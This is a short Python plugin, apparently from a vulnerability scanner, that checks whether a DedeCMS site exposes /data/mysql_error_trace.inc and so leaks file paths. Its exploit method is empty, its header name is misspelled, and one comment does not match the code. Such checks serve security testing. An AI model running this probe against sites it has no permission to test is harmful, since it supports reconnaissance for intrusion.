# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class dedecms_error_trace_disclosure(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'dedecms',
            'vuln_title':'dedecms_error_trace_disclosure',
            'vuln_level':3,
            'vuln_type':10,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'访问mysql_error_trace.inc,mysql trace报错路径泄露',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/data/mysql_error_trace.inc"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if r"<?php  exit()" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = dedecms_error_trace_disclosure("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)